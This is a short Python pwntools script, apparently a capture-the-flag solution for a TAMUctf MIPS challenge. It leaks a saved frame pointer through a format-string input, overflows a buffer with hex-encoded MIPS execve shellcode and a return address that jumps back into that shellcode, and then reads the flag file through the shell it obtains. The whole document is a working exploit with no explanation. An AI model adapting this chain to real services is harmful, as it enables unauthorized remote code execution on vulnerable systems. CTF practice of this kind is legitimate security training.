from pwn import *

context.arch = "mips"
context.bits = 32
context.endian = "big"
context.os = "linux"
io = remote("streams.tamuctf.com", 443, ssl=True, sni="meep")
shellcode = bytes.fromhex(
    "3c092f623529696eafa9fff83c19d08c373997ff03204827"
    "afa9fffc27bdfff803a020202805ffff2806ffff34020fab"
    "0101010c"
)

io.recvuntil(b"Enter admin name: ")
io.send(b"%40$p\x00")
io.recvuntil(b"Hello:\n\n")
saved_fp = int(io.recvuntil(b"Enter diagnostic command:", drop=True).strip(), 16)
diagnostics_buf = saved_fp - 0x90
payload = shellcode.ljust(140, b"A") + p32(diagnostics_buf)
io.send(payload.ljust(0x100, b"B"))
io.recvuntil(b"Running command...\n")
io.sendline(b"cat /home/flag.txt")
print(io.recvrepeat(2).decode("latin-1", "replace"), end="")
